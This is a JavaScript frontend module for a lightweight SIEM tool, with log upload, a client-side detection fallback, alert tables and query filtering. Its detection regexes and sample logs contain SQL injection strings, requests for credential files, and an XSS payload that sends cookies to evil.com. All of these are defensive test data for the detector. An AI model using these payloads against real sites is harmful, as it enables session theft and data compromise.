/**
 * ShadeParse — siem.js
 * Lightweight SIEM frontend module.
 * Handles: log upload/paste, pipeline animation, alert rendering,
 *          severity counters, timeline, and JSON export.
 *
 * Architecture note: follows the same patterns as scanner.js /
 * network.js — no framework, plain ES5-compatible JS, global helpers
 * from utils.js (escHtml, showToast, addAuditLog).
 */

'use strict';

/* ─── SIEM PIPELINE DEFINITION ──────────────────────────────────────────── */

var SIEM_PIPE = [
  { id: 'ingest',      name: 'Log Ingestion',     sub: 'Parse & normalize'    },
  { id: 'parse',       name: 'Field Extractor',   sub: 'IP, TS, method, path' },
  { id: 'detect',      name: 'Detection Engine',  sub: 'SQLi, XSS, scanner'   },
  { id: 'behavioral',  name: 'Behavioral Engine', sub: 'Brute force, floods'  },
  { id: 'correlate',   name: 'Correlation',       sub: 'Cross-IP analysis'    },
  { id: 'score',       name: 'Risk Scoring',      sub: 'Dedup & rank'         },
];

/* ─── STATE ──────────────────────────────────────────────────────────────── */

var SIEM = {
  running:     false,
  lastResult:  null,
  backendUrl:  'http://127.0.0.1:5050',
  useBackend:  true,    /* set false to use client-side engine only */
};

/* ─── SEVERITY CONFIG ────────────────────────────────────────────────────── */

var SEV_CONFIG = {
  CRITICAL: { color: 'var(--red)',    icon: '⛔', order: 4 },
  HIGH:     { color: 'var(--coral)',  icon: '🔴', order: 3 },
  MEDIUM:   { color: 'var(--amber)',  icon: '🟡', order: 2 },
  LOW:      { color: 'var(--green)',  icon: '🟢', order: 1 },
  INFO:     { color: 'var(--teal)',   icon: 'ℹ️', order: 0 },
};

/* ─── PIPELINE RENDERER ──────────────────────────────────────────────────── */

function siemRenderPipe(activeId, doneIds) {
  doneIds = doneIds || [];
  var el = document.getElementById('siemPipeList');
  if (!el) return;

  var html = '';
  SIEM_PIPE.forEach(function(step) {
    var isDone  = doneIds.indexOf(step.id) > -1;
    var isAct   = step.id === activeId;
    var cls     = isDone ? 'done' : isAct ? 'active' : '';
    var dot     = isDone ? '&#10003;' : step.id.slice(0, 2).toUpperCase();

    html += '<div class="pipe-step ' + cls + '">';
    html += '<div class="pdot">' + dot + '</div>';
    html += '<div class="pinfo">';
    html += '<div class="pname">' + escHtml(step.name) + '</div>';
    html += '<div class="psub">'  + escHtml(step.sub)  + '</div>';
    html += '</div></div>';
  });

  el.innerHTML = html;
}

function siemSetProgress(pct, label) {
  var fill = document.getElementById('siemProgFill');
  var lbl  = document.getElementById('siemProgLabel');
  if (fill) fill.style.width = pct + '%';
  if (lbl)  lbl.textContent  = label || '';
}

/* ─── PIPELINE ANIMATION (simulated stages while waiting for backend) ────── */

function siemAnimatePipeline(onComplete) {
  var ids   = SIEM_PIPE.map(function(s) { return s.id; });
  var done  = [];
  var idx   = 0;
  var total = ids.length;

  function step() {
    if (idx >= total) {
      siemRenderPipe(null, ids);
      siemSetProgress(100, 'Complete');
      if (typeof onComplete === 'function') onComplete();
      return;
    }
    var cur = ids[idx];
    siemRenderPipe(cur, done.slice());
    siemSetProgress(Math.round((idx / total) * 100), SIEM_PIPE[idx].name + '...');
    done.push(cur);
    idx++;
    setTimeout(step, 320);
  }

  siemRenderPipe(ids[0], []);
  siemSetProgress(0, 'Starting...');
  setTimeout(step, 100);
}

/* ─── LOG SUBMISSION ─────────────────────────────────────────────────────── */

function siemRunAnalysis() {
  if (SIEM.running) return;

  var pasteEl = document.getElementById('siemLogPaste');
  var fileEl  = document.getElementById('siemFileInput');
  var fmtEl   = document.getElementById('siemLogFormat');

  var pasteVal = pasteEl ? pasteEl.value.trim() : '';
  var file     = fileEl  && fileEl.files && fileEl.files[0] ? fileEl.files[0] : null;
  var fmt      = fmtEl   ? fmtEl.value : 'auto';

  if (!pasteVal && !file) {
    showToast('Please paste logs or upload a file first.', 'warn');
    return;
  }

  SIEM.running = true;
  siemSetRunButton(true);
  siemClearResults();
  siemAddLog('Starting SIEM pipeline...', 'info');

  // Animate pipeline visually while request is in-flight
  siemAnimatePipeline(function() {
    siemAddLog('Pipeline complete — rendering results.', 'ok');
  });

  if (SIEM.useBackend && file) {
    siemSubmitFile(file, fmt);
  } else if (SIEM.useBackend) {
    siemSubmitPaste(pasteVal, fmt);
  } else {
    // Client-side fallback (basic, no behavioral analysis)
    siemClientSideAnalyze(pasteVal);
  }
}

function siemSubmitPaste(logs, fmt) {
  siemAddLog('Sending logs to SIEM backend...', 'info');

  fetch(SIEM.backendUrl + '/siem/analyze', {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ logs: logs, format: fmt }),
  })
  .then(function(r) { return r.json(); })
  .then(function(data) { siemHandleResult(data); })
  .catch(function(err) {
    siemAddLog('Backend unreachable — using client-side engine.', 'warn');
    // Fallback to client-side engine
    siemClientSideAnalyze(logs);
  });
}

function siemSubmitFile(file, fmt) {
  siemAddLog('Uploading log file: ' + escHtml(file.name), 'info');

  var fd = new FormData();
  fd.append('file', file);
  fd.append('format', fmt);

  fetch(SIEM.backendUrl + '/siem/analyze', {
    method: 'POST',
    body:   fd,
  })
  .then(function(r) { return r.json(); })
  .then(function(data) { siemHandleResult(data); })
  .catch(function(err) {
    // Read file client-side and fall back
    var reader = new FileReader();
    reader.onload = function(e) {
      siemAddLog('Falling back to client-side engine.', 'warn');
      siemClientSideAnalyze(e.target.result);
    };
    reader.readAsText(file);
  });
}

/* ─── RESULT HANDLER ─────────────────────────────────────────────────────── */

function siemHandleResult(data) {
  SIEM.running    = false;
  SIEM.lastResult = data;
  siemSetRunButton(false);

  if (!data || !data.success) {
    var msg = (data && data.error) ? data.error : 'Unknown error';
    showToast('SIEM Error: ' + msg, 'error');
    siemAddLog('Error: ' + msg, 'err');
    return;
  }

  siemAddLog(
    'Analysis complete — ' + data.total_alerts + ' alerts in ' +
    data.elapsed_ms + 'ms across ' + data.log_count + ' log entries.',
    'ok'
  );

  siemRenderSeverityCounters(data.severity || {});
  siemRenderAlertsTable(data.alerts || []);
  siemRenderTimeline(data.timeline || []);
  siemRenderStageCounts(data.stage_counts || {});

  // Show results panel
  var panel = document.getElementById('siemResultsPanel');
  if (panel) panel.style.display = 'block';

  // Update dashboard badge if the function exists
  if (typeof updateDashboard === 'function' && APP && APP.state) {
    updateDashboard(APP.state);
  }
  showToast(
    data.total_alerts + ' SIEM alert' + (data.total_alerts === 1 ? '' : 's') + ' detected.',
    data.total_alerts > 0 ? 'warn' : 'ok'
  );
}

/* ─── CLIENT-SIDE DETECTION ENGINE (fallback) ───────────────────────────── */

var _CLIENT_SQLI = [
  /'\s*OR\s+['"\d]/i, /UNION\s+SELECT/i, /DROP\s+TABLE/i,
  /1\s*=\s*1/i, /SLEEP\s*\(\d+\)/i, /INFORMATION_SCHEMA/i,
];
var _CLIENT_XSS  = [
  /<script[\s>]/i, /javascript\s*:/i, /on(?:load|click|error|focus)\s*=/i,
  /eval\s*\(/i, /document\s*\.\s*(?:write|cookie)/i,
];
var _CLIENT_BRUTE = /\/(?:admin|wp-admin|phpmyadmin|\.env|config|backup|\.git)/i;
var _CLIENT_SCAN  = /(?:sqlmap|nikto|nmap|nuclei|gobuster|dirbuster|wfuzz|burpsuite)/i;

function siemClientSideAnalyze(raw) {
  var lines   = raw.split('\n').filter(function(l) { return l.trim(); });
  var alerts  = [];
  var ipStats = {};

  lines.forEach(function(line) {
    var ipM  = line.match(/\b(\d{1,3}(?:\.\d{1,3}){3})\b/);
    var ip   = ipM ? ipM[1] : null;
    var tsM  = line.match(/\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}/);
    var ts   = tsM ? tsM[0] : null;
    var mthM = line.match(/"(GET|POST|PUT|DELETE|PATCH)\s+([^\s"]+)/);
    var mth  = mthM ? mthM[1] : null;
    var ep   = mthM ? mthM[2] : null;

    if (ip) {
      ipStats[ip] = (ipStats[ip] || 0) + 1;
    }

    // SQLi
    var sqli = _CLIENT_SQLI.some(function(r) { return r.test(line); });
    if (sqli) alerts.push({ type: 'SQL Injection', severity: 'HIGH', ip: ip, timestamp: ts, endpoint: ep, evidence: line.slice(0, 200), risk_score: 75 });

    // XSS
    var xss = _CLIENT_XSS.some(function(r) { return r.test(line); });
    if (xss)  alerts.push({ type: 'Cross-Site Scripting (XSS)', severity: 'HIGH', ip: ip, timestamp: ts, endpoint: ep, evidence: line.slice(0, 200), risk_score: 70 });

    // Dir brute
    if (ep && _CLIENT_BRUTE.test(ep)) {
      alerts.push({ type: 'Directory Brute Force', severity: 'MEDIUM', ip: ip, timestamp: ts, endpoint: ep, evidence: ep, risk_score: 50 });
    }

    // Scanner UA
    if (_CLIENT_SCAN.test(line)) {
      alerts.push({ type: 'Security Scanner', severity: 'MEDIUM', ip: ip, timestamp: ts, endpoint: ep, evidence: line.slice(0, 200), risk_score: 55 });
    }
  });

  // High-frequency IPs
  Object.keys(ipStats).forEach(function(ip) {
    if (ipStats[ip] >= 50) {
      alerts.push({ type: 'High-Frequency Requests', severity: 'MEDIUM', ip: ip, timestamp: null, endpoint: null, evidence: ipStats[ip] + ' requests', risk_score: 48 });
    }
  });

  // Build synthetic result object
  var sev = {};
  alerts.forEach(function(a) { sev[a.severity] = (sev[a.severity] || 0) + 1; });

  var timeline = Object.keys(ipStats).map(function(ip) {
    return { ip: ip, events: ipStats[ip], types: [] };
  }).sort(function(a, b) { return b.events - a.events; });

  siemHandleResult({
    success:      true,
    elapsed_ms:   0,
    log_count:    lines.length,
    total_alerts: alerts.length,
    alerts:       alerts,
    severity:     sev,
    timeline:     timeline,
    stage_counts: { ingested: lines.length, parsed: lines.length, final_alerts: alerts.length },
    timestamp:    new Date().toISOString(),
  });
}

/* ─── RENDERING: SEVERITY COUNTERS ──────────────────────────────────────── */

function siemRenderSeverityCounters(sev) {
  var el = document.getElementById('siemSevCounters');
  if (!el) return;

  var keys = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'];
  var html = '';

  keys.forEach(function(k) {
    var cfg   = SEV_CONFIG[k] || {};
    var count = sev[k] || 0;
    html += '<div class="siem-sev-card" style="border-color:' + cfg.color + '33">';
    html += '<div class="siem-sev-icon" style="color:' + cfg.color + '">' + cfg.icon + '</div>';
    html += '<div class="siem-sev-count" style="color:' + cfg.color + '">' + count + '</div>';
    html += '<div class="siem-sev-label">' + escHtml(k) + '</div>';
    html += '</div>';
  });

  el.innerHTML = html;
}

/* ─── RENDERING: ALERTS TABLE ───────────────────────────────────────────── */

function siemRenderAlertsTable(alerts) {
  var tbody = document.getElementById('siemAlertsBody');
  var empty = document.getElementById('siemAlertsEmpty');
  if (!tbody) return;

  if (!alerts || alerts.length === 0) {
    tbody.innerHTML = '';
    if (empty) empty.style.display = 'block';
    return;
  }

  if (empty) empty.style.display = 'none';

  var html = '';
  alerts.forEach(function(alert, idx) {
    var cfg    = SEV_CONFIG[alert.severity] || SEV_CONFIG.INFO;
    var sevBdg = '<span class="siem-sev-badge" style="background:' + cfg.color + '22;color:' + cfg.color + ';border-color:' + cfg.color + '44">' + escHtml(alert.severity) + '</span>';
    var ip     = alert.ip        ? escHtml(alert.ip)       : '<span class="siem-na">N/A</span>';
    var ts     = alert.timestamp ? escHtml(alert.timestamp.slice(0,19)) : '<span class="siem-na">—</span>';
    var ep     = alert.endpoint  ? '<code class="siem-path">' + escHtml(alert.endpoint.slice(0,60)) + '</code>' : '<span class="siem-na">—</span>';
    var occ    = alert.occurrences > 1 ? '<span class="siem-occ">×' + alert.occurrences + '</span>' : '';
    var score  = alert.risk_score || 0;
    var fill   = Math.min(100, score);
    var fillColor = score >= 75 ? 'var(--red)' : score >= 50 ? 'var(--amber)' : 'var(--green)';

    html += '<tr class="siem-row" onclick="siemToggleDetail(' + idx + ')">';
    html += '<td>' + sevBdg + '</td>';
    html += '<td><strong>' + escHtml(alert.type) + '</strong>' + occ + '</td>';
    html += '<td>' + ip + '</td>';
    html += '<td>' + ts + '</td>';
    html += '<td>' + ep + '</td>';
    html += '<td>';
    html += '<div class="siem-score-wrap">';
    html += '<div class="siem-score-bar"><div class="siem-score-fill" style="width:' + fill + '%;background:' + fillColor + '"></div></div>';
    html += '<span class="siem-score-val">' + score + '</span>';
    html += '</div>';
    html += '</td>';
    html += '</tr>';

    // Expandable detail row
    html += '<tr class="siem-detail-row" id="siemDetail' + idx + '" style="display:none">';
    html += '<td colspan="6">';
    html += '<div class="siem-detail-wrap">';
    if (alert.evidence) {
      html += '<div class="siem-detail-label">EVIDENCE</div>';
      html += '<pre class="siem-evidence">' + escHtml(alert.evidence) + '</pre>';
    }
    if (alert.patterns && alert.patterns.length) {
      html += '<div class="siem-detail-label">MATCHED PATTERNS</div>';
      html += '<div class="siem-patterns">' +
        alert.patterns.map(function(p) {
          return '<code class="siem-pattern-tag">' + escHtml(p) + '</code>';
        }).join(' ') + '</div>';
    }
    if (alert.correlation_note) {
      html += '<div class="siem-corr-note">⚠ ' + escHtml(alert.correlation_note) + '</div>';
    }
    html += '</div>';
    html += '</td></tr>';
  });

  tbody.innerHTML = html;

  // Store alerts reference for expand/collapse
  siemRenderAlertsTable._cache = alerts;
}

function siemToggleDetail(idx) {
  var row = document.getElementById('siemDetail' + idx);
  if (!row) return;
  var visible = row.style.display !== 'none';
  row.style.display = visible ? 'none' : 'table-row';
}

/* ─── RENDERING: TIMELINE ────────────────────────────────────────────────── */

function siemRenderTimeline(timeline) {
  var el = document.getElementById('siemTimeline');
  if (!el) return;

  if (!timeline || timeline.length === 0) {
    el.innerHTML = '<div class="siem-empty-msg">No IP activity to display.</div>';
    return;
  }

  var maxEvents = timeline.reduce(function(m, t) { return Math.max(m, t.events); }, 1);

  var html = '<table class="siem-timeline-table">';
  html += '<thead><tr><th>IP Address</th><th>Events</th><th>Attack Types</th><th>Activity</th></tr></thead>';
  html += '<tbody>';

  timeline.slice(0, 15).forEach(function(item) {
    var pct  = Math.round((item.events / maxEvents) * 100);
    var types = (item.types || []).slice(0, 3).join(', ') || '—';
    var barColor = pct > 70 ? 'var(--red)' : pct > 40 ? 'var(--amber)' : 'var(--teal)';

    html += '<tr>';
    html += '<td><code class="siem-ip">' + escHtml(item.ip) + '</code></td>';
    html += '<td><strong>' + item.events + '</strong></td>';
    html += '<td class="siem-types">' + escHtml(types) + '</td>';
    html += '<td>';
    html += '<div class="siem-activity-bar">';
    html += '<div class="siem-activity-fill" style="width:' + pct + '%;background:' + barColor + '"></div>';
    html += '</div>';
    html += '</td>';
    html += '</tr>';
  });

  html += '</tbody></table>';
  el.innerHTML = html;
}

/* ─── RENDERING: STAGE COUNTS ────────────────────────────────────────────── */

function siemRenderStageCounts(counts) {
  var el = document.getElementById('siemStageCounts');
  if (!el) return;

  var stages = [
    { key: 'ingested',          label: 'Lines Ingested'   },
    { key: 'parsed',            label: 'Lines Parsed'     },
    { key: 'rule_alerts',       label: 'Rule Hits'        },
    { key: 'behavioral_alerts', label: 'Behavioral Hits'  },
    { key: 'correlated',        label: 'After Correlation'},
    { key: 'final_alerts',      label: 'Final Alerts'     },
  ];

  var html = '';
  stages.forEach(function(s) {
    var v = counts[s.key];
    if (v === undefined) return;
    html += '<div class="siem-stage-stat">';
    html += '<div class="siem-stage-val">' + v + '</div>';
    html += '<div class="siem-stage-label">' + escHtml(s.label) + '</div>';
    html += '</div>';
  });

  el.innerHTML = html;
}

/* ─── AUDIT LOG ──────────────────────────────────────────────────────────── */

function siemAddLog(msg, type) {
  var el = document.getElementById('siemAuditLog');
  if (!el) return;

  var colorMap = { ok: 'var(--green)', warn: 'var(--amber)', err: 'var(--red)', info: 'var(--text2)' };
  var color    = colorMap[type] || colorMap.info;

  var now = new Date();
  var ts  = now.toTimeString().slice(0, 8);

  var div = document.createElement('div');
  div.className = 'siem-log-line';
  div.innerHTML = '<span class="siem-log-ts">' + escHtml(ts) + '</span>' +
                  '<span class="siem-log-msg" style="color:' + color + '">' + escHtml(msg) + '</span>';

  el.appendChild(div);
  el.scrollTop = el.scrollHeight;

  // Mirror to global audit log if available
  if (typeof addAuditLog === 'function') {
    addAuditLog('[SIEM] ' + msg);
  }
}

/* ─── UI HELPERS ─────────────────────────────────────────────────────────── */

function siemSetRunButton(running) {
  var btn = document.getElementById('siemRunBtn');
  if (!btn) return;
  btn.disabled    = running;
  btn.textContent = running ? 'Analyzing...' : 'Run Analysis';
  btn.style.opacity = running ? '0.6' : '1';
}

function siemClearResults() {
  var els = ['siemSevCounters', 'siemAlertsBody', 'siemTimeline', 'siemStageCounts'];
  els.forEach(function(id) {
    var el = document.getElementById(id);
    if (el) el.innerHTML = '';
  });
  var panel = document.getElementById('siemResultsPanel');
  if (panel) panel.style.display = 'none';

  siemRenderPipe(null, []);
  siemSetProgress(0, 'Idle');
}

function siemExportJSON() {
  if (!SIEM.lastResult) {
    showToast('No analysis results to export.', 'warn');
    return;
  }
  var json = JSON.stringify(SIEM.lastResult, null, 2);
  var blob = new Blob([json], { type: 'application/json' });
  var url  = URL.createObjectURL(blob);
  var a    = document.createElement('a');
  a.href   = url;
  a.download = 'siem-alerts-' + new Date().toISOString().slice(0, 10) + '.json';
  a.click();
  URL.revokeObjectURL(url);
  siemAddLog('Exported ' + SIEM.lastResult.total_alerts + ' alerts as JSON.', 'ok');
}

/* Handle file drop on SIEM drop zone */
function siemInitDropZone() {
  var zone = document.getElementById('siemDropZone');
  if (!zone) return;

  zone.addEventListener('dragover', function(e) {
    e.preventDefault();
    zone.classList.add('drag-over');
  });
  zone.addEventListener('dragleave', function() {
    zone.classList.remove('drag-over');
  });
  zone.addEventListener('drop', function(e) {
    e.preventDefault();
    zone.classList.remove('drag-over');
    var files = e.dataTransfer.files;
    if (files && files[0]) {
      var fi = document.getElementById('siemFileInput');
      if (fi) {
        // Assign dropped file to the hidden file input
        var dt = new DataTransfer();
        dt.items.add(files[0]);
        fi.files = dt.files;
        siemShowFileName(files[0].name);
      }
    }
  });
}

function siemShowFileName(name) {
  var el = document.getElementById('siemFileName');
  if (el) {
    el.textContent = name;
    el.style.display = 'inline';
  }
}

function siemLoadSample() {
  var el = document.getElementById('siemLogPaste');
  if (!el) return;
  el.value = SIEM_SAMPLE_LOGS;
  siemAddLog('Sample logs loaded — click Run Analysis.', 'info');
}

/* ─── SAMPLE LOGS ────────────────────────────────────────────────────────── */

var SIEM_SAMPLE_LOGS = [
  '2024-03-15T08:22:01Z 192.168.1.10 "GET /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T08:22:05Z 192.168.1.10 "GET /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T08:22:09Z 192.168.1.10 "GET /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T08:22:12Z 192.168.1.10 "GET /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T08:22:15Z 192.168.1.10 "POST /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T08:22:18Z 192.168.1.10 "POST /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T08:25:00Z 10.0.0.55 "GET /search?q=\' OR 1=1-- HTTP/1.1" 200 - "sqlmap/1.7"',
  '2024-03-15T08:25:01Z 10.0.0.55 "GET /users?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 500 - "sqlmap/1.7"',
  '2024-03-15T08:26:00Z 10.0.0.55 "POST /comment HTTP/1.1" 200 - "sqlmap/1.7" payload=<script>document.location=\'http://evil.com/steal?c=\'+document.cookie</script>',
  '2024-03-15T08:30:00Z 172.16.0.8 "GET /wp-admin HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:01Z 172.16.0.8 "GET /.env HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:02Z 172.16.0.8 "GET /backup.zip HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:03Z 172.16.0.8 "GET /.git/config HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:04Z 172.16.0.8 "GET /phpmyadmin HTTP/1.1" 403 - "nikto/2.1.6"',
  '2024-03-15T08:30:05Z 172.16.0.8 "GET /config.php HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:06Z 172.16.0.8 "GET /etc/passwd HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:07Z 172.16.0.8 "GET /id_rsa HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T08:30:08Z 172.16.0.8 "GET /.htaccess HTTP/1.1" 403 - "nikto/2.1.6"',
  '2024-03-15T08:31:00Z 203.0.113.42 "GET / HTTP/1.1" 200 - "curl/7.88"',
  '2024-03-15T08:35:00Z 192.168.1.10 "GET /dashboard HTTP/1.1" 200 - "Mozilla/5.0"',
].join('\n');

/* ─── ELK-STYLE SEARCH RULES ─────────────────────────────────────────────── */

/**
 * Search state: parsed tokens derived from the query string.
 * Each token: { field, op, val, raw }
 *   field: 'severity' | 'ip' | 'type' | 'score' | 'endpoint' | 'any'
 *   op:    ':' | ':>' | ':<' | ':>=' | ':<=' | ':!'
 *   val:   string or number
 */
var SIEM_SEARCH = {
  tokens: [],        // active parsed tokens
  quickFilters: [],  // { field, val } added via quick-filter buttons
};

/** Parse a KQL-like query string into token objects */
function siemParseQuery(raw) {
  var tokens = [];
  if (!raw || !raw.trim()) return tokens;

  // Regex: field:op?value  OR  bare freetext
  // Supported field aliases
  var FIELD_MAP = {
    severity: 'severity', sev: 'severity',
    ip:       'ip',       src: 'ip',
    type:     'type',     attack: 'type',
    score:    'score',    risk: 'score',
    endpoint: 'endpoint', path: 'endpoint', ep: 'endpoint',
  };

  // Split on whitespace but keep quoted strings together
  var parts = raw.match(/(?:[^\s"]+|"[^"]*")+/g) || [];

  parts.forEach(function(part) {
    // Try field:op?value
    var m = part.match(/^(\w+)(:[<>!]=?|:)(.+)$/);
    if (m) {
      var fieldRaw = m[1].toLowerCase();
      var opRaw    = m[2];
      var valRaw   = m[3].replace(/^"|"$/g, ''); // strip quotes

      var field = FIELD_MAP[fieldRaw];
      if (field) {
        var op = opRaw;
        var val = (field === 'score') ? parseFloat(valRaw) : valRaw.toLowerCase();
        tokens.push({ field: field, op: op, val: val, raw: part });
        return;
      }
    }
    // Bare text → match any field
    var bare = part.replace(/^"|"$/g, '').toLowerCase();
    if (bare) {
      tokens.push({ field: 'any', op: ':', val: bare, raw: part });
    }
  });

  return tokens;
}

/** Test a single alert against a single token */
function siemTokenMatch(alert, token) {
  var val = token.val;
  var op  = token.op;

  function contains(str) {
    return str && str.toLowerCase().indexOf(val) !== -1;
  }
  function numOp(n) {
    n = parseFloat(n) || 0;
    if (op === ':>') return n > val;
    if (op === ':<') return n < val;
    if (op === ':>=') return n >= val;
    if (op === ':<=') return n <= val;
    if (op === ':!')  return n !== val;
    return n === val || String(n).indexOf(String(val)) !== -1;
  }

  switch (token.field) {
    case 'severity': return op === ':!'
      ? (alert.severity || '').toLowerCase() !== val
      : (alert.severity || '').toLowerCase() === val || contains(alert.severity);
    case 'ip':       return contains(alert.ip);
    case 'type':     return contains(alert.type);
    case 'score':    return numOp(alert.risk_score);
    case 'endpoint': return contains(alert.endpoint);
    case 'any':
      return contains(alert.type) || contains(alert.severity) ||
             contains(alert.ip)   || contains(alert.endpoint) ||
             contains(alert.evidence);
    default: return true;
  }
}

/** Filter the cached alerts against all active tokens + quick-filters */
function siemFilterAlerts(alerts) {
  var all = SIEM_SEARCH.tokens.concat(SIEM_SEARCH.quickFilters.map(function(qf) {
    return { field: qf.field, op: ':', val: qf.val.toLowerCase(), raw: '' };
  }));

  if (!all.length) return alerts;

  return alerts.filter(function(alert) {
    return all.every(function(token) {
      return siemTokenMatch(alert, token);
    });
  });
}

/** Re-render the alerts table applying the current search/filter state */
function siemApplySearch() {
  var input = document.getElementById('siemSearchInput');
  var raw   = input ? input.value : '';

  SIEM_SEARCH.tokens = siemParseQuery(raw);

  // Show/hide clear button
  var clearBtn = document.getElementById('siemSearchClear');
  if (clearBtn) clearBtn.style.display = raw.trim() ? 'inline' : 'none';

  siemRefreshAlertsView();
  siemUpdateSearchHint();
}

/** Refresh alerts table with filtered subset */
function siemRefreshAlertsView() {
  var cache = siemRenderAlertsTable._cache;
  if (!cache) return;

  var filtered = siemFilterAlerts(cache);
  siemRenderAlertsTableFiltered(filtered, cache.length);
  siemRenderFilterChips();
}

/**
 * Render a FILTERED subset of alerts into the existing table.
 * Same logic as siemRenderAlertsTable but also shows match count.
 */
function siemRenderAlertsTableFiltered(alerts, total) {
  var tbody = document.getElementById('siemAlertsBody');
  var empty = document.getElementById('siemAlertsEmpty');
  if (!tbody) return;

  // Update section title hint
  var hint = document.querySelector('.siem-section-hint');
  if (hint && total !== undefined) {
    if (alerts.length < total) {
      hint.textContent = 'Showing ' + alerts.length + ' of ' + total + ' alerts';
      hint.style.color = 'var(--amber)';
    } else {
      hint.textContent = 'Click a row to expand evidence';
      hint.style.color = '';
    }
  }

  if (!alerts || alerts.length === 0) {
    tbody.innerHTML = '';
    if (empty) {
      empty.style.display = 'block';
      empty.textContent = (total > 0)
        ? 'No alerts match the current search rule.'
        : 'No alerts detected — logs appear clean.';
    }
    return;
  }

  if (empty) empty.style.display = 'none';

  var html = '';
  alerts.forEach(function(alert, idx) {
    var cfg    = SEV_CONFIG[alert.severity] || SEV_CONFIG.INFO;
    var sevBdg = '<span class="siem-sev-badge" style="background:' + cfg.color + '22;color:' + cfg.color + ';border-color:' + cfg.color + '44">' + escHtml(alert.severity) + '</span>';
    var ip     = alert.ip        ? escHtml(alert.ip)                        : '<span class="siem-na">N/A</span>';
    var ts     = alert.timestamp ? escHtml(alert.timestamp.slice(0,19))     : '<span class="siem-na">—</span>';
    var ep     = alert.endpoint  ? '<code class="siem-path">' + escHtml(alert.endpoint.slice(0,60)) + '</code>' : '<span class="siem-na">—</span>';
    var occ    = alert.occurrences > 1 ? '<span class="siem-occ">×' + alert.occurrences + '</span>' : '';
    var score  = alert.risk_score || 0;
    var fill   = Math.min(100, score);
    var fillColor = score >= 75 ? 'var(--red)' : score >= 50 ? 'var(--amber)' : 'var(--green)';
    var realIdx = (siemRenderAlertsTable._cache || []).indexOf(alert);
    var rowIdx  = realIdx > -1 ? realIdx : idx;

    html += '<tr class="siem-row" onclick="siemToggleDetail(' + rowIdx + ')">';
    html += '<td>' + sevBdg + '</td>';
    html += '<td><strong>' + escHtml(alert.type) + '</strong>' + occ + '</td>';
    html += '<td>' + ip + '</td>';
    html += '<td>' + ts + '</td>';
    html += '<td>' + ep + '</td>';
    html += '<td><div class="siem-score-wrap"><div class="siem-score-bar"><div class="siem-score-fill" style="width:' + fill + '%;background:' + fillColor + '"></div></div><span class="siem-score-val">' + score + '</span></div></td>';
    html += '</tr>';
    html += '<tr class="siem-detail-row" id="siemDetail' + rowIdx + '" style="display:none">';
    html += '<td colspan="6"><div class="siem-detail-wrap">';
    if (alert.evidence) {
      html += '<div class="siem-detail-label">EVIDENCE</div>';
      html += '<pre class="siem-evidence">' + escHtml(alert.evidence) + '</pre>';
    }
    if (alert.patterns && alert.patterns.length) {
      html += '<div class="siem-detail-label">MATCHED PATTERNS</div>';
      html += '<div class="siem-patterns">' + alert.patterns.map(function(p) {
        return '<code class="siem-pattern-tag">' + escHtml(p) + '</code>';
      }).join(' ') + '</div>';
    }
    if (alert.correlation_note) {
      html += '<div class="siem-corr-note">⚠ ' + escHtml(alert.correlation_note) + '</div>';
    }
    html += '</div></td></tr>';
  });

  tbody.innerHTML = html;
}

/** Render active-filter chip pills below the search bar */
function siemRenderFilterChips() {
  var el = document.getElementById('siemFilterChips');
  if (!el) return;

  var chips = [];

  SIEM_SEARCH.tokens.forEach(function(t, i) {
    chips.push(
      '<span class="siem-chip">' +
        escHtml(t.raw) +
        '<button class="siem-chip-del" onclick="siemRemoveToken(' + i + ')" title="Remove">✕</button>' +
      '</span>'
    );
  });

  SIEM_SEARCH.quickFilters.forEach(function(qf, i) {
    chips.push(
      '<span class="siem-chip siem-chip-quick">' +
        escHtml(qf.field + ':' + qf.val) +
        '<button class="siem-chip-del" onclick="siemRemoveQuickFilter(' + i + ')" title="Remove">✕</button>' +
      '</span>'
    );
  });

  el.innerHTML = chips.join('');
  el.style.display = chips.length ? 'flex' : 'none';
}

/** Update the inline search hint (syntax help) */
function siemUpdateSearchHint() {
  var hint = document.getElementById('siemSearchHint');
  var input = document.getElementById('siemSearchInput');
  if (!hint || !input) return;
  var raw = input.value.trim();

  if (!raw) {
    hint.textContent = 'Syntax: severity:HIGH  ip:10.0  type:SQL  score:>70  endpoint:/admin';
    hint.style.display = 'block';
  } else {
    var count = SIEM_SEARCH.tokens.length;
    hint.textContent = count + ' rule token' + (count !== 1 ? 's' : '') + ' active';
    hint.style.display = 'block';
  }
}

/** Remove a parsed token by index and re-apply */
function siemRemoveToken(idx) {
  SIEM_SEARCH.tokens.splice(idx, 1);
  // Rebuild input from remaining tokens
  var input = document.getElementById('siemSearchInput');
  if (input) {
    input.value = SIEM_SEARCH.tokens.map(function(t) { return t.raw; }).join(' ');
  }
  siemRefreshAlertsView();
  siemUpdateSearchHint();
}

/** Remove a quick-filter by index */
function siemRemoveQuickFilter(idx) {
  var removed = SIEM_SEARCH.quickFilters.splice(idx, 1)[0];
  // Un-highlight the corresponding button
  var btns = document.querySelectorAll('.siem-qf-btn');
  btns.forEach(function(btn) {
    if (btn.dataset.field === removed.field && btn.dataset.val.toLowerCase() === removed.val.toLowerCase()) {
      btn.classList.remove('active');
    }
  });
  siemRefreshAlertsView();
  siemUpdateSearchHint();
}

/** Toggle a quick-filter button and update state */
function siemQuickFilter(btn) {
  var field = btn.dataset.field;
  var val   = btn.dataset.val;
  var isActive = btn.classList.contains('active');

  if (isActive) {
    // Remove
